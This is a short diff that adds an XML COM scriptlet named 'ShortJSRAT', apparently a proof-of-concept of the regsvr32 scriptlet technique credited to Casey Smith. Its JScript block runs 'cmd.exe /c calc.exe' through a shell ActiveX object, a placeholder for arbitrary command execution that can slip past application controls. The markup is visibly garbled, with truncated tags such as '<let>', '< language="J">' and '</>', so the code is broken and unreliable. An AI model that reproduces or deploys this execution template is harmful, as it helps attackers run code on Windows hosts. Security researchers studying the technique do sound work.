@@ -1,0 +1,14 @@
+<?XML version="1.0"?>
+<let>
+<registration 
+    progid="ShortJSRAT"
+    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
+    <!-- Learn from Casey Smith @subTee -->
+    < language="J">
+    <![CDATA[
+        ps = "cmd.exe /c calc.exe";
+        new ActiveXObject("W.Shell").Run(ps,0,true);
+    ]]>
+    </>
+</registration>
+</let>
